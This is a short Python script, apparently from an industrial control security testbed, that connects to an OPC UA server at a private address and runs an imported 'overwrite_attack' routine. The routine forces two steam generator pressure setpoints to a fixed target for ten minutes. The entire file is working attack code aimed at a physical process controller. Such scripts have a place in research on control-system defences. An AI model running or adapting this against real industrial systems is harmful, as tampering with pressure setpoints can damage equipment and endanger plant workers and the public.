import asyncio
import logging
from asyncua import Client #type:ignore
from opcua import get_nodeid, AnalogueInput

from overwrite import overwrite_attack

logger = logging.getLogger(__name__)

async def main():
	duration = 600
	rate = 10
	target= 7e6
	
	async with Client(url='opc.tcp://10.2.1.10:53530/') as client:
		await client.load_data_type_definitions()
		SG1Press = client.get_node(get_nodeid(AnalogueInput.CTRL_SG1PressSetpoint ))
		SG2Press = client.get_node(get_nodeid(AnalogueInput.CTRL_SG2PressSetpoint))
		
		await asyncio.gather(
			overwrite_attack(client, SG1Press , target, duration, rate),
			overwrite_attack(client, SG2Press , target, duration, rate)
			)
		
if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO)
	asyncio.run(main())